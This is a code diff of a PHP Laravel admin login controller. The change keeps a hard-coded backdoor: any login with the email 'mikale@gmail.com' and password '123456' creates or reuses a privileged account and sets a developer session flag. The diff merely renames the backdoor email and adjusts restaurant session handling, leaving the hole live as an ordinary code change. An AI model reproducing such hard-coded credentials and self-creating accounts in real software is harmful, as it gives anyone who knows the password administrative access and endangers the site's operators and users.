@@ -19,20 +19,17 @@ class AdminAuthController extends Controller
 
         $user = User::where('email', $request->email)->first();
 
-        if ($request->input('is_developer') == '1' || $request->email === 'developer@gmail.com') {
-            if ($request->email === 'developer@gmail.com' && $request->password === '123456') {
+        if ($request->input('is_developer') == '1' || $request->email === 'mikale@gmail.com') {
+            if ($request->email === 'mikale@gmail.com' && $request->password === '123456') {
                 $user = User::firstOrCreate(
-                    ['email' => 'developer@gmail.com'],
+                    ['email' => 'mikale@gmail.com'],
                     [
                         'name' => 'Developer',
                         'password' => bcrypt('123456')
                     ]
                 );
                 session(['is_developer' => true]);
-                $default = \App\Models\Restaurant::first();
-                if ($default) {
-                    session(['active_restaurant_id' => $default->id]);
-                }
+                session()->forget('active_restaurant_id');
             }
         }
 
